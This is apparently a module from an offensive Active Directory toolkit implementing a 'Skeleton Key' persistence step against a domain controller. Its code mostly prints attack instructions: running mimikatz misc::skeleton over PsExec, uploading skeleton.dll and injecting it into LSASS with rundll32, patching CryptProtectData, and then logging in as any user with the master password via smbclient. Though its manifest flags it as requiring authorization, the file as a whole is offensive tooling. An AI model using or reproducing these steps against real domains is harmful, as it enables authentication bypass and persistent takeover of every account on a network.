"""Skeleton Key  -  inject master password into LSASS on DC."""
import sys
from typing import Any
from adxpl.core.credential import ADCredential

MANIFEST = {
    "capability_id": "adxpl.persistence.skeleton_key.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["lsass_injection", "authentication_bypass"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1556.001"],
}


def run(args: Any) -> int:
    cred = ADCredential.from_args(args)
    target = args.target
    master_password = getattr(args, "skeleton_password", "mimikatz")

    print(f"[*] Skeleton Key injection → {target} (password: {master_password})")
    print("[!] WARNING: This modifies LSASS on the DC  -  use with caution")
    print("[!] Skeleton Key persists until DC reboot")

    try:
        from impacket.smbconnection import SMBConnection
    except ImportError:
        print("[!] impacket not installed", file=sys.stderr)
        return 1

    print("[*] Method 1: Remote mimikatz via PsExec")
    print("  misc::skeleton")
    print()
    print("[*] Method 2: Remote DLL injection via WMI/PsExec")
    print("  1. Upload skeleton.dll to target")
    print("  2. Inject into LSASS: rundll32.exe skeleton.dll,inject")
    print()
    print("[*] Method 3: DPAPI skeleton (stealthier)")
    print("  - Patch LSASS CryptProtectData to accept master key")
    print()
    print("[*] After injection, authenticate as ANY user with:")
    print(f"  Password: {master_password}")
    print(f"  smbclient //{target}/ -U '{cred.domain}\\any_user%{master_password}'")
    return 0
